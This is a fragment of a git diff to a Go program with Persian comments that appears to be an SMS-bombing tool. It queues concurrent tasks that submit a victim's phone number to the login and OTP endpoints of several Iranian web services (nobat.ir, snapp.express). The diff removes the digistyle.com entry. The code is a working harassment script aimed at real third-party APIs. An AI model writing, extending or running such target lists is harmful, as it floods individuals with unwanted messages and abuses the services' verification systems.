@@ -499,15 +499,6 @@ func main() {
 			sendFormRequest(ctx, "https://nobat.ir/api/public/patient/login/phone", formData, &wg, ch)
 		}
 
-		// digistyle.com (Form) - payload شبیه به فرم داده URL encoded است
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			// کلید 'loginRegister%5Bemail_phone%5D' decode میشود به 'loginRegister[email_phone]'
-			formData.Set("loginRegister[email_phone]", phone)
-			sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
-		}
-
 		// api.snapp.express (Form) - URL شامل پارامترهای query زیاد و payload شبیه به فرم داده
 		wg.Add(1)
 		tasks <- func() {
